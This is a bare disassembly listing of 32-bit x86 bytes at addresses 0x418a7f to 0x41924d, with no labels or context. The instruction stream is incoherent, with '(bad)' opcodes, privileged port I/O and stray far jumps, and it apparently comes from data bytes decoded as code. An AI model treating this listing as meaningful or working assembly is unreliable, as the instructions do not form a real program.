  418a7f:	sub    DWORD PTR [esp+edi*4],eax
  418a82:	js     0x418aa9
  418a84:	cmp    eax,0x60adeb1f
  418a89:	pop    es
  418a8a:	xor    dh,dl
  418a8c:	pop    eax
  418a8d:	jecxz  0x418a89
  418a8f:	push   esp
  418a90:	pop    es
  418a91:	mov    esp,0x5e3597ee
  418a96:	xchg   esi,eax
  418a97:	test   al,0xcd
  418a99:	test   DWORD PTR [edx+0x53],eax
  418a9c:	pop    ss
  418a9d:	sub    al,0x63
  418a9f:	mov    ecx,DWORD PTR [edi-0x3d9035cd]
  418aa5:	inc    ecx
  418aa6:	mul    BYTE PTR [edi+0xcae5ada]
  418aac:	imul   ebp,DWORD PTR [edx+0x16],0xd9372307
  418ab3:	inc    ebx
  418ab4:	adc    dl,BYTE PTR [ebx-0x42393aef]
  418aba:	pop    ecx
  418abb:	mov    ebp,0x6e1aeed4
  418ac0:	sbb    al,0x37
  418ac2:	mov    al,cs:0xbf86f9cd
  418ac8:	cmp    BYTE PTR [edi+0x328d191b],0xe8
  418acf:	or     eax,0x83c65285
  418ad4:	ficomp WORD PTR [edx-0x4b]
  418ad7:	enter  0x92ae,0x6a
  418adb:	into   
  418adc:	ss (bad) 
  418ade:	fucom  st(1)
  418ae0:	dec    BYTE PTR [eax]
  418ae2:	push   esp
  418ae3:	repz js 0x418b60
  418ae6:	inc    BYTE PTR [ebx+0x22]
  418ae9:	lock push esp
  418aeb:	and    DWORD PTR [ebx+0x2],0x84067f5f
  418af2:	xor    BYTE PTR [ebx+0x53],cl
  418af5:	jge    0x418b57
  418af7:	mov    ebp,0x688dccb0
  418afc:	test   al,0x5
  418afe:	pop    esi
  418aff:	out    dx,al
  418b00:	mov    edx,0x158116a4
  418b05:	sbb    al,0xde
  418b07:	and    DWORD PTR [esi+edx*8+0x79693ac5],ebx
  418b0e:	in     eax,0xa7
  418b10:	mov    edi,0xa007d227
  418b15:	cmp    eax,0xbe2a242c
  418b1a:	jmp    0xc0834f69
  418b1f:	fsub   st,st(1)
  418b21:	push   esi
  418b22:	pop    edx
  418b23:	out    dx,eax
  418b24:	cld    
  418b25:	jbe    0x418ac0
  418b27:	xchg   ebx,eax
  418b28:	jae    0x418ae2
  418b2a:	test   edx,0xbc95b8af
  418b30:	dec    esi
  418b31:	cmp    DWORD PTR [edx+0x7656595c],edi
  418b37:	jb     0x418b0e
  418b39:	mov    cl,0xd1
  418b3b:	mov    edi,0x9ed9c2b6
  418b40:	outs   dx,DWORD PTR ds:[esi]
  418b41:	push   ebp
  418b42:	mov    bh,0x93
  418b44:	dec    ecx
  418b45:	call   esi
  418b47:	das    
  418b48:	into   
  418b49:	jo     0x418b85
  418b4b:	and    eax,0x55e9247b
  418b50:	sti    
  418b51:	cwde   
  418b52:	cmp    BYTE PTR [eax-0x40fed57a],ch
  418b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b59:	mov    esi,0x6051b517
  418b5e:	leave  
  418b5f:	imul   DWORD PTR [esi+0x1110fe2f]
  418b65:	aad    0x87
  418b67:	cmp    al,0x98
  418b69:	lds    edx,FWORD PTR [edi]
  418b6b:	out    dx,al
  418b6c:	mov    BYTE PTR [edi+0x45],dh
  418b6f:	cli    
  418b70:	cmp    DWORD PTR [esi-0x1],ebp
  418b73:	gs push esi
  418b75:	cmp    BYTE PTR [ebx+0x54],ch
  418b78:	sub    DWORD PTR [ebx+0x63],edi
  418b7b:	out    dx,eax
  418b7c:	in     al,0x28
  418b7e:	or     edi,esi
  418b80:	dec    ecx
  418b81:	and    BYTE PTR [eax-0x3b14585],ah
  418b87:	adc    edx,DWORD PTR [edi]
  418b89:	paddq  mm7,mm7
  418b8c:	xchg   ebx,eax
  418b8d:	xchg   edx,eax
  418b8e:	rol    DWORD PTR [eax+0xb],1
  418b91:	mov    cl,BYTE PTR [ebx]
  418b93:	ja     0x418b9a
  418b95:	arpl   WORD PTR [esi+0x3eda4288],bp
  418b9b:	ret    
  418b9c:	stc    
  418b9d:	push   edi
  418b9e:	jmp    0x475554a7
  418ba3:	pop    ss
  418ba4:	mov    WORD PTR [ebx+0x3db69faf],ss
  418baa:	cli    
  418bab:	mov    ah,0xb0
  418bad:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  418baf:	inc    esi
  418bb0:	cld    
  418bb1:	add    DWORD PTR [ecx+0x75],esp
  418bb4:	push   ecx
  418bb5:	xor    al,0x86
  418bb7:	cmp    DWORD PTR [edx-0x35dfd9d6],eax
  418bbd:	mov    ecx,0x95acaa0d
  418bc2:	lahf   
  418bc3:	add    al,0x98
  418bc5:	jge    0x418c20
  418bc7:	mov    dl,0x2a
  418bc9:	std    
  418bca:	push   eax
  418bcb:	and    BYTE PTR [esi+ebp*2+0x12d4534],0xb8
  418bd3:	mov    esi,0xe6b45717
  418bd8:	out    0x99,al
  418bda:	in     al,dx
  418bdb:	jle    0x418b7a
  418bdd:	mov    dl,ch
  418bdf:	jl     0x418ba7
  418be1:	setno  bl
  418be4:	mov    ds:0x9326daee,al
  418be9:	repnz sti 
  418beb:	les    ebx,FWORD PTR [edx-0x59]
  418bee:	dec    esp
  418bef:	or     BYTE PTR [ebx+0x41],bh
  418bf2:	aad    0xdb
  418bf4:	push   es
  418bf5:	mov    ecx,0xee60ae5
  418bfa:	mov    BYTE PTR [edi+0x59],0x5d
  418bfe:	dec    edx
  418bff:	xor    eax,0x6086795f
  418c04:	bnd jbe 0x418c7b
  418c07:	pop    esi
  418c08:	(bad)  
  418c09:	fwait
  418c0a:	pop    esi
  418c0b:	pop    es
  418c0c:	aaa    
  418c0d:	add    dl,0x10
  418c10:	lods   eax,DWORD PTR ds:[esi]
  418c11:	test   al,0x39
  418c13:	shl    DWORD PTR cs:[di-0x3888],1
  418c19:	xor    al,0x4a
  418c1b:	and    eax,0x7fb8902f
  418c20:	stos   BYTE PTR es:[edi],al
  418c21:	mov    edi,0xbd05d83c
  418c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c27:	dec    ebp
  418c28:	pop    edx
  418c29:	or     ecx,ebx
  418c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c2c:	clc    
  418c2d:	div    DWORD PTR [esi+0x4b]
  418c30:	and    bl,bl
  418c32:	sbb    BYTE PTR [esi-0x10],al
  418c35:	arpl   WORD PTR [edi],bx
  418c37:	js     0x418be7
  418c39:	jae    0x418bc1
  418c3b:	sub    bl,BYTE PTR [edx]
  418c3d:	shl    DWORD PTR ds:[esi-0x66],0x94
  418c42:	mov    WORD PTR [edx],?
  418c44:	nop
  418c45:	mov    cl,0x7
  418c47:	neg    DWORD PTR [eax-0x2e]
  418c4a:	loopne 0x418c36
  418c4c:	sti    
  418c4d:	add    bh,BYTE PTR [ebp+0x4b]
  418c50:	call   0xa4d8:0x2d25bc89
  418c57:	hlt    
  418c58:	jno    0x418caa
  418c5a:	aad    0x2f
  418c5c:	lods   eax,DWORD PTR ds:[esi]
  418c5d:	sub    al,0x3e
  418c5f:	or     ch,bl
  418c61:	in     eax,0xe8
  418c63:	stc    
  418c64:	mov    bh,0x45
  418c66:	sub    DWORD PTR ss:[eax+0x51724487],edi
  418c6d:	adc    cl,BYTE PTR [ecx+eax*2+0xde88b7b]
  418c74:	rcr    BYTE PTR [ebp-0x53],cl
  418c77:	pop    ecx
  418c78:	shr    edi,cl
  418c7a:	pop    ds
  418c7b:	cmp    al,0x59
  418c7d:	or     BYTE PTR [ecx-0x68],dh
  418c80:	out    dx,al
  418c81:	inc    ebp
  418c82:	imul   edx,DWORD PTR [edi],0x469619e1
  418c88:	and    al,0x53
  418c8a:	out    dx,al
  418c8b:	push   ebx
  418c8c:	scas   al,BYTE PTR es:[edi]
  418c8d:	mov    esp,0x45fa731d
  418c92:	and    ebx,DWORD PTR [eax]
  418c94:	push   edi
  418c95:	fdiv   QWORD PTR [ebx]
  418c97:	fsubp  st(1),st
  418c99:	mov    ds:0x9dc84565,al
  418c9e:	out    0xf7,eax
  418ca0:	mov    edx,0x91c08f24
  418ca5:	lahf   
  418ca6:	out    0xbe,eax
  418ca8:	cdq    
  418ca9:	mov    al,0x18
  418cab:	jp     0x418c94
  418cad:	(bad)  
  418caf:	pushf  
  418cb0:	fcomi  st,st(1)
  418cb2:	inc    eax
  418cb3:	imul   ebx,DWORD PTR [edx-0x7a6802da],0x4d
  418cba:	icebp  
  418cbb:	mov    BYTE PTR [ecx],dh
  418cbd:	mov    ch,0xf1
  418cbf:	or     DWORD PTR [ebp+0x213587a1],edi
  418cc5:	and    DWORD PTR [edi],esi
  418cc7:	or     al,0xed
  418cc9:	add    bl,BYTE PTR [ebx]
  418ccb:	cmp    al,0xa
  418ccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cce:	jmp    0xcb3bc964
  418cd3:	mov    ecx,0x6b055201
  418cd8:	mov    esi,0xb55a15e0
  418cdd:	inc    ebx
  418cde:	rol    DWORD PTR [edx-0x2d],cl
  418ce1:	cli    
  418ce2:	mov    db7,edi
  418ce5:	push   esp
  418ce6:	loop   0x418d45
  418ce8:	mov    cl,0xa0
  418cea:	ficomp DWORD PTR [edx-0x37]
  418ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cee:	fsub   QWORD PTR [ebp+0x4a]
  418cf1:	neg    DWORD PTR ds:0x83272d13
  418cf7:	fdiv   QWORD PTR [edi+0x52]
  418cfa:	cs das 
  418cfc:	cmp    DWORD PTR [edx+ebx*4],eax
  418cff:	(bad)  
  418d00:	je     0x418d71
  418d02:	mov    bl,BYTE PTR [edi+ecx*4-0x6c]
  418d06:	mov    ebx,0xf3677fb5
  418d0b:	lahf   
  418d0c:	xchg   edx,eax
  418d0d:	push   esi
  418d0e:	aad    0x51
  418d10:	ficomp DWORD PTR [edi+0x7d585bca]
  418d16:	outs   dx,BYTE PTR ds:[esi]
  418d17:	dec    edx
  418d18:	lahf   
  418d19:	stc    
  418d1a:	xor    ch,BYTE PTR [ecx]
  418d1c:	pop    edi
  418d1d:	out    0x35,al
  418d1f:	outs   dx,DWORD PTR ds:[esi]
  418d20:	adc    DWORD PTR [ecx-0xb5f695f],edi
  418d26:	fadd   DWORD PTR [esi]
  418d28:	or     DWORD PTR [ebp-0x10],0x9658e5ed
  418d2f:	cli    
  418d30:	mov    ebp,0x90f6ef4a
  418d35:	scas   al,BYTE PTR es:[edi]
  418d36:	adc    eax,0xfec17101
  418d3b:	inc    ebx
  418d3c:	fld    TBYTE PTR [eax]
  418d3e:	fucomp st(0)
  418d40:	mov    WORD PTR [edi+eax*4-0x2],ss
  418d44:	dec    eax
  418d45:	fldcw  WORD PTR [esi-0x1e]
  418d48:	mov    dl,0xa2
  418d4a:	aas    
  418d4b:	xchg   BYTE PTR [edi],ah
  418d4d:	mov    ebp,DWORD PTR [edi-0x179b27f]
  418d53:	pop    eax
  418d54:	cmp    DWORD PTR [esi-0x55],edx
  418d57:	dec    DWORD PTR [di+0x219b]
  418d5c:	fiadd  WORD PTR [edx]
  418d5e:	popa   
  418d5f:	lods   al,BYTE PTR ds:[esi]
  418d60:	ror    DWORD PTR [edi],cl
  418d62:	jge    0x418d36
  418d64:	cmp    BYTE PTR [esi],bh
  418d66:	int3   
  418d67:	lods   al,BYTE PTR ds:[esi]
  418d68:	mov    ah,0x63
  418d6a:	out    0x35,al
  418d6c:	sub    BYTE PTR [eax+ebp*4],dl
  418d6f:	retf   
  418d70:	push   0xab1325b4
  418d75:	cmp    BYTE PTR [edi-0x7da8869d],0xe6
  418d7c:	mov    ebp,0x9a2cdb59
  418d81:	add    edi,DWORD PTR [ecx-0x7]
  418d84:	xchg   edi,eax
  418d85:	sbb    BYTE PTR ds:0x167e6eb5,bh
  418d8b:	leave  
  418d8c:	sbb    DWORD PTR [eax],esi
  418d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d8f:	jo     0x418d37
  418d91:	sahf   
  418d92:	sahf   
  418d93:	imul   esp,DWORD PTR [esi-0xabd6c5d],0xabf95104
  418d9d:	jbe    0x418d37
  418d9f:	push   esp
  418da0:	and    BYTE PTR [edi-0x6b],bl
  418da3:	ja     0x418df3
  418da5:	loopne 0x418d6d
  418da7:	sub    bh,BYTE PTR [ebx+ebx*1]
  418daa:	mov    ds:0x875060a,al
  418daf:	in     eax,0x5c
  418db1:	(bad)  
  418db2:	jnp    0x418d4b
  418db4:	shl    BYTE PTR [ecx-0x5cce31b7],cl
  418dba:	(bad)  
  418dbb:	adc    DWORD PTR [edx-0x13974e48],ebx
  418dc1:	retf   
  418dc2:	out    dx,eax
  418dc3:	xchg   esi,eax
  418dc4:	int3   
  418dc5:	or     eax,0x7231a7d2
  418dca:	sbb    eax,0x8d18941f
  418dcf:	retf   0x95cf
  418dd2:	inc    dx
  418dd4:	sbb    ecx,ecx
  418dd6:	pop    ss
  418dd7:	pop    esp
  418dd8:	jp     0x418e1f
  418dda:	dec    ecx
  418ddb:	cli    
  418ddc:	xor    DWORD PTR fs:[esi-0x6174ce3a],0x6a40a399
  418de7:	loopne 0x418e61
  418de9:	mov    edi,0x148a1f36
  418dee:	(bad)  
  418def:	cmp    eax,0xe004cc83
  418df4:	fidivr WORD PTR [esi+0x4]
  418df7:	add    ecx,DWORD PTR [esi+0x54]
  418dfa:	es pop edx
  418dfc:	pop    ecx
  418dfd:	retf   0x3818
  418e00:	pop    ds
  418e01:	mov    ecx,0x5cff995c
  418e06:	dec    esp
  418e07:	dec    esi
  418e08:	jg     0x418de6
  418e0a:	mov    ds:0x4f44a157,eax
  418e0f:	mov    al,0x4d
  418e11:	or     al,0x2f
  418e13:	iret   
  418e14:	inc    esi
  418e15:	dec    esi
  418e16:	and    eax,0xc78af678
  418e1b:	lock jg 0x418e88
  418e1e:	outs   dx,BYTE PTR ds:[esi]
  418e1f:	pop    eax
  418e20:	fcomp  QWORD PTR [edi+0x9]
  418e23:	push   edx
  418e24:	call   0xdff22c50
  418e29:	fcmovnu st,st(4)
  418e2b:	xlat   BYTE PTR ds:[ebx]
  418e2c:	inc    eax
  418e2d:	lea    ecx,[edx-0x60ac7481]
  418e33:	fmul   DWORD PTR [esi]
  418e35:	push   edx
  418e36:	add    BYTE PTR [esi-0x4f],cl
  418e39:	xchg   ecx,eax
  418e3a:	retf   
  418e3b:	cmp    DWORD PTR [esp+ebx*1-0x5f],eax
  418e3f:	xor    cl,BYTE PTR [esi+0x5c]
  418e42:	pop    ds
  418e43:	jecxz  0x418e47
  418e45:	xacquire xchg DWORD PTR [eax-0x32],ecx
  418e49:	push   edi
  418e4a:	xor    al,0x7e
  418e4c:	cwde   
  418e4d:	push   edi
  418e4e:	cmp    dl,BYTE PTR [ebx+0x1f]
  418e51:	xchg   edi,eax
  418e52:	push   ebp
  418e53:	mov    al,ds:0x9b8dbe2b
  418e58:	push   0x710a726
  418e5d:	dec    esi
  418e5e:	es ds and dh,al
  418e62:	jge    0x418de6
  418e64:	inc    ebx
  418e65:	mov    eax,ds:0x94d19c82
  418e6a:	mov    bh,bh
  418e6c:	push   ebx
  418e6d:	pop    esp
  418e6e:	pusha  
  418e6f:	mov    ebp,0x2bf0f4a2
  418e74:	lea    esp,[ecx+ecx*1+0x66]
  418e78:	js     0x418e43
  418e7a:	jns    0x418eec
  418e7c:	fdivr  DWORD PTR [edi-0x1198265e]
  418e82:	push   es
  418e83:	cmp    BYTE PTR [esp+eax*1+0x56531177],cl
  418e8a:	mov    edx,0xf43b0a14
  418e8f:	jo     0x418ecb
  418e91:	shr    DWORD PTR [ebx],0x33
  418e94:	sub    dl,BYTE PTR [ebx+0x391c9a6]
  418e9a:	or     eax,edi
  418e9c:	pop    ebp
  418e9d:	mov    es,WORD PTR [esi-0x40]
  418ea0:	xchg   esp,eax
  418ea1:	add    DWORD PTR [eax+0x451d7fa8],0x46
  418ea8:	pop    edx
  418ea9:	les    ebp,FWORD PTR [ebp+0x6136e8ec]
  418eaf:	mov    ecx,0x16819b27
  418eb4:	mov    ebp,0x54d44813
  418eb9:	mov    cl,0x7
  418ebb:	jnp    0x418e4d
  418ebd:	sub    bl,BYTE PTR [eax-0x701552db]
  418ec3:	iret   
  418ec4:	push   0xfffffff6
  418ec6:	xlat   BYTE PTR ds:[ebx]
  418ec7:	pop    esp
  418ec8:	push   ds
  418ec9:	xchg   cl,bh
  418ecb:	jb     0x418e97
  418ecd:	test   BYTE PTR [eax-0x3],bl
  418ed0:	inc    eax
  418ed1:	rcl    esi,1
  418ed3:	sar    BYTE PTR [esi],0x6a
  418ed6:	adc    ch,BYTE PTR [esi+0x3851ca4]
  418edc:	pop    ebp
  418edd:	jg     0x418f12
  418edf:	jl     0x418f5d
  418ee1:	pop    ds
  418ee2:	jmp    0x418f0c
  418ee4:	push   ss
  418ee5:	mov    al,ds:0x5fb3a2c6
  418eea:	sub    DWORD PTR [edx-0x363f71bc],ebx
  418ef0:	jmp    0x9679:0x3b059314
  418ef7:	inc    esi
  418ef8:	mov    ds:0x69128b70,al
  418efd:	add    DWORD PTR [ecx+0x4b94ac09],eax
  418f03:	loopne 0x418ef4
  418f05:	inc    ecx
  418f06:	pop    ss
  418f07:	pmulhuw mm1,QWORD PTR [esi]
  418f0a:	add    cl,dl
  418f0c:	arpl   bx,si
  418f0e:	mov    edi,0x4a05cc05
  418f13:	and    BYTE PTR [esi],dh
  418f15:	cmp    esp,DWORD PTR [esi]
  418f17:	jge    0x418f1f
  418f19:	sbb    al,0x7b
  418f1b:	es jnp 0x418f6f
  418f1e:	jmp    0x8d79:0x5f532d30
  418f25:	bound  ebp,QWORD PTR [ebx+0x16]
  418f28:	jmp    0x6655bb66
  418f2d:	sub    al,0x8c
  418f2f:	lock repz pop ds
  418f32:	shr    al,cl
  418f34:	mov    ds:0xbe798cc0,al
  418f39:	mov    ds:0xfdb812c0,al
  418f3e:	mov    edi,0x11bc3ef2
  418f43:	adc    eax,DWORD PTR [ebp+0x72fefb18]
  418f49:	pop    eax
  418f4a:	mov    esp,0xeab687b7
  418f4f:	data16 ins BYTE PTR es:[edi],dx
  418f51:	add    dh,BYTE PTR [esi]
  418f53:	mov    bh,0x2
  418f55:	xchg   ebx,eax
  418f56:	mov    ds:0xcd61848d,al
  418f5b:	sub    cl,BYTE PTR [esi+0x1908bb56]
  418f61:	add    al,0x1d
  418f63:	mov    ecx,0xcd2d9188
  418f68:	lods   eax,DWORD PTR ds:[esi]
  418f69:	inc    BYTE PTR [ecx]
  418f6b:	je     0x418f7d
  418f6d:	loopne 0x418f8c
  418f6f:	call   0x4839bf53
  418f74:	inc    edi
  418f75:	arpl   bp,di
  418f77:	addr16 dec ebx
  418f79:	ret    0x5807
  418f7c:	fs inc edx
  418f7e:	mov    WORD PTR [edx+edi*8],ds
  418f81:	mov    esi,DWORD PTR [ecx]
  418f83:	(bad)  
  418f84:	(bad)  
  418f86:	push   ebp
  418f87:	hlt    
  418f88:	and    BYTE PTR [eax],ah
  418f8a:	aaa    
  418f8b:	hlt    
  418f8c:	rcl    BYTE PTR [eax+0x3f],1
  418f8f:	mov    edi,0xfd7e00d9
  418f94:	stos   DWORD PTR es:[edi],eax
  418f95:	lock adc edx,edi
  418f98:	push   edi
  418f99:	push   es
  418f9a:	aas    
  418f9b:	or     al,0x77
  418f9d:	sbb    BYTE PTR [edi],dl
  418f9f:	ss push edx
  418fa1:	xor    BYTE PTR [ecx],al
  418fa3:	mov    edi,0xc9dbc044
  418fa8:	add    dh,bl
  418faa:	mov    ebx,0xedcd560f
  418faf:	aad    0x7a
  418fb1:	sbb    al,0xf0
  418fb3:	retf   
  418fb4:	loope  0x418f71
  418fb6:	shl    DWORD PTR [ebp-0x62],1
  418fb9:	and    BYTE PTR [edx],dl
  418fbb:	push   ss
  418fbc:	inc    edx
  418fbd:	scas   eax,DWORD PTR es:[edi]
  418fbe:	outs   dx,BYTE PTR ds:[esi]
  418fbf:	push   ds
  418fc0:	mov    al,ds:0x2f6198e
  418fc5:	inc    edi
  418fc6:	stc    
  418fc7:	add    dl,dl
  418fc9:	mov    esi,0x38fdc088
  418fce:	jno    0x418f7b
  418fd0:	mov    ds:0xa26f1393,al
  418fd5:	int3   
  418fd6:	sti    
  418fd7:	in     eax,dx
  418fd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fd9:	pusha  
  418fda:	cwde   
  418fdb:	pop    es
  418fdc:	sub    BYTE PTR [ebx],dh
  418fde:	lahf   
  418fdf:	pop    esp
  418fe0:	dec    ebp
  418fe1:	shl    esp,1
  418fe3:	add    eax,0x9b97533f
  418fe9:	dec    edx
  418fea:	adc    al,0xc0
  418fec:	bound  ebx,QWORD PTR [ecx+0x5ef7a23a]
  418ff2:	dec    esp
  418ff3:	fdiv   QWORD PTR [esi]
  418ff5:	jge    0x418fd0
  418ff7:	pop    ebp
  418ff8:	push   eax
  418ff9:	(bad)
  418ffc:	adc    ch,BYTE PTR [esp+edx*2+0x6c]
  419000:	xor    DWORD PTR [ebp-0x68],ebp
  419003:	dec    edx
  419004:	enter  0x9a32,0x48
  419008:	ror    DWORD PTR [esi-0x32],cl
  41900b:	lods   al,BYTE PTR ds:[esi]
  41900c:	xor    BYTE PTR [ecx+0x4ff2a7c5],0xa1
  419013:	xor    bl,BYTE PTR [edi-0x4d]
  419016:	jno    0x419038
  419018:	lods   al,BYTE PTR ds:[esi]
  419019:	test   al,0x22
  41901b:	mov    BYTE PTR [esi+ecx*1-0x44],ch
  41901f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419020:	xor    ebx,ecx
  419022:	je     0x419017
  419024:	int    0x7c
  419026:	or     BYTE PTR [edi+0x25],bl
  419029:	jg     0x418fd4
  41902b:	jmp    0x62dbc65e
  419030:	jne    0x418fbb
  419032:	adc    al,0x1a
  419034:	sbb    ch,BYTE PTR [ebx-0x37]
  419037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419038:	test   BYTE PTR [edi-0x737dfc5b],0x85
  41903f:	int    0xd
  419041:	jno    0x41901a
  419043:	aaa    
  419044:	lahf   
  419045:	lock pop edx
  419047:	fucom  st(1)
  419049:	pop    ebx
  41904a:	rol    BYTE PTR [ebp+0x1758c1d0],cl
  419050:	arpl   dx,di
  419052:	jnp    0x419023
  419054:	push   eax
  419055:	std    
  419056:	pop    esp
  419057:	dec    esp
  419058:	in     al,0x1e
  41905a:	je     0x419069
  41905c:	stos   DWORD PTR es:[edi],eax
  41905d:	popa   
  41905e:	shl    cl,0x91
  419061:	out    dx,eax
  419062:	push   cs
  419063:	mov    ebp,0xa0550200
  419068:	out    0x4c,eax
  41906a:	push   ss
  41906b:	and    dh,dh
  41906d:	(bad)  
  41906e:	xlat   BYTE PTR ds:[ebx]
  41906f:	jo     0x419081
  419071:	pop    ebx
  419072:	lds    ebx,FWORD PTR [ebx+0x7e065793]
  419078:	std    
  419079:	repnz push eax
  41907b:	mov    dl,0x75
  41907d:	rol    DWORD PTR [esi+0x6],0xc6
  419081:	pop    es
  419082:	push   edi
  419083:	mov    edx,0x55885de2
  419088:	jmp    0xce9826d9
  41908d:	mov    ecx,0xc410ff42
  419092:	out    dx,al
  419093:	or     esi,DWORD PTR [esi]
  419095:	jo     0x4190f5
  419097:	das    
  419098:	jecxz  0x41906c
  41909a:	dec    esp
  41909b:	sahf   
  41909c:	xor    eax,0xfd506c6c
  4190a1:	lea    eax,[edx]
  4190a3:	mov    ds:0x528461c3,al
  4190a8:	or     bl,BYTE PTR [ecx+0x23e46411]
  4190ae:	adc    ecx,DWORD PTR [esi]
  4190b0:	rcl    DWORD PTR [edx+0x48],cl
  4190b3:	ret    0xe982
  4190b6:	pop    es
  4190b7:	jge    0x419055
  4190b9:	xor    al,BYTE PTR [ebx+0x3de9ba9a]
  4190bf:	ret    
  4190c0:	das    
  4190c1:	xchg   edi,eax
  4190c2:	(bad)
  4190c5:	repnz push ebx
  4190c7:	or     edi,DWORD PTR [eax+0x30]
  4190ca:	out    dx,al
  4190cb:	popf   
  4190cc:	mov    eax,DWORD PTR [ebx-0x14]
  4190cf:	pop    esi
  4190d0:	and    esi,DWORD PTR [ebp+0x7d]
  4190d3:	xchg   edi,eax
  4190d4:	(bad)  
  4190d5:	cmp    eax,DWORD PTR [eax-0x16]
  4190d8:	(bad)  
  4190d9:	fsubr  DWORD PTR [edi+0x2b]
  4190dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190dd:	jmp    0x483f3986
  4190e2:	and    ebp,ebp
  4190e4:	ins    BYTE PTR es:[edi],dx
  4190e5:	sbb    eax,0x74cded7a
  4190ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190eb:	lea    ebx,[edi-0x72fae57d]
  4190f1:	dec    DWORD PTR [ecx+ebp*8]
  4190f4:	test   BYTE PTR [ebp+0x42],0x25
  4190f8:	mov    cl,0x89
  4190fa:	nop
  4190fb:	sbb    ebp,ebp
  4190fd:	gs pop ss
  4190ff:	mov    eax,0xddb72d26
  419104:	unpcklps xmm2,xmm2
  419107:	pop    ecx
  419108:	popf   
  419109:	mov    ah,0xe7
  41910b:	test   DWORD PTR [ebx],esp
  41910d:	sbb    eax,0x3238bf1
  419112:	rol    DWORD PTR [eax+ebx*1],0x30
  419116:	call   0xdf3e9b8f
  41911b:	outs   dx,BYTE PTR ds:[esi]
  41911c:	das    
  41911d:	xchg   ebp,eax
  41911e:	jmp    0x3794:0x73a934b3
  419125:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419127:	mov    edx,0xe956686c
  41912c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41912d:	ret    0xc4c9
  419130:	jb     0x41919e
  419132:	pop    ebx
  419133:	xchg   esp,eax
  419134:	cmp    BYTE PTR [ebx-0x6e],dh
  419137:	fwait
  419138:	jbe    0x419154
  41913a:	pop    es
  41913b:	fwait
  41913c:	mov    cs,WORD PTR [edx+0x10c29afb]
  419142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419143:	lds    eax,FWORD PTR [ecx]
  419145:	mov    dl,0x51
  419147:	bound  ebx,QWORD PTR [edx-0x76]
  41914a:	fdiv   DWORD PTR [esi+0x46]
  41914d:	jge    0x4190d9
  41914f:	cmp    dl,0x5f
  419152:	push   esp
  419153:	cli    
  419154:	loopne 0x41913b
  419156:	mov    ds:0x58220a19,eax
  41915b:	(bad)  
  41915c:	mov    WORD PTR [edx-0x62],es
  41915f:	sub    eax,0xd135ca94
  419164:	push   0x4ec495
  419169:	dec    esi
  41916a:	rcr    DWORD PTR ds:0x302442c9,cl
  419170:	and    edx,ecx
  419172:	es aas 
  419174:	mov    dh,0x20
  419176:	mov    eax,ds:0xa4a1db9
  41917b:	ret    
  41917c:	cmp    edx,DWORD PTR [ebx]
  41917e:	(bad)  
  41917f:	arpl   WORD PTR [esi-0x78],sp
  419182:	and    al,0x73
  419184:	icebp  
  419185:	add    dl,BYTE PTR [edi]
  419187:	mov    ebx,0xd82b6bb1
  41918c:	add    DWORD PTR [ebx],edi
  41918e:	xor    edx,DWORD PTR [edi]
  419190:	fcomp  DWORD PTR ds:0xb215ae48
  419196:	loop   0x41918b
  419198:	and    edi,DWORD PTR [ebp+0x5dfc4383]
  41919e:	adc    ecx,DWORD PTR [esi]
  4191a0:	repz dec esi
  4191a2:	aam    0x79
  4191a4:	cs in  eax,0x9c
  4191a7:	inc    ebp
  4191a8:	push   ebp
  4191a9:	xor    eax,0x89466b27
  4191ae:	push   eax
  4191af:	in     eax,0x1e
  4191b1:	push   ss
  4191b2:	inc    edx
  4191b3:	stc    
  4191b4:	rdmsr  
  4191b6:	jecxz  0x419229
  4191b8:	mov    edi,DWORD PTR [esi-0x5]
  4191bb:	test   al,0xf5
  4191bd:	call   0x605a:0x6305e363
  4191c4:	cdq    
  4191c5:	repz mov eax,ds:0xc4bcd8b
  4191cb:	daa    
  4191cc:	sbb    eax,0x331fd831
  4191d1:	fdivr  DWORD PTR [ecx+0x51f36198]
  4191d7:	push   0xffffffd5
  4191d9:	xor    DWORD PTR [ebx-0x2b4ea820],esi
  4191df:	mov    es,WORD PTR [eax]
  4191e1:	test   eax,0x737eb376
  4191e6:	jmp    0x355952da
  4191eb:	ins    BYTE PTR es:[edi],dx
  4191ec:	addr16 icebp 
  4191ee:	adc    cl,BYTE PTR [ebx-0x7d]
  4191f1:	scas   eax,DWORD PTR es:[edi]
  4191f2:	sub    al,0xf
  4191f4:	jne    0x419217
  4191f6:	shr    BYTE PTR [edi+0x629dd043],cl
  4191fc:	mov    ah,0xd1
  4191fe:	mov    ah,0xcc
  419200:	jge    0x4191d4
  419202:	and    ecx,DWORD PTR [ebx]
  419204:	test   eax,0x7c4c7714
  419209:	repnz aam 0xfe
  41920c:	and    al,0xd5
  41920e:	(bad)  
  41920f:	cmp    eax,0xa99eb55
  419214:	xchg   edi,eax
  419215:	sbb    ebp,eax
  419217:	adc    ecx,esi
  419219:	xor    esi,ecx
  41921b:	cmp    al,0x28
  41921d:	aad    0x18
  41921f:	adc    DWORD PTR es:[edi-0x7b],esi
  419223:	ins    DWORD PTR es:[edi],dx
  419224:	jbe    0x419202
  419226:	cmp    BYTE PTR [edx-0x50b8cb47],dl
  41922c:	shl    BYTE PTR [ebp+0xc320b09],cl
  419232:	in     eax,dx
  419233:	ror    BYTE PTR [edi+0x8],1
  419236:	clc    
  419237:	aad    0xd2
  419239:	cmc    
  41923a:	push   ss
  41923b:	jb     0x41921c
  41923d:	std    
  41923e:	out    0xbf,eax
  419240:	aaa    
  419241:	jmp    0x218796d4
  419246:	imul   ebx,DWORD PTR [edx-0x70],0xb35b399a
  41924d:	jb     0x419289
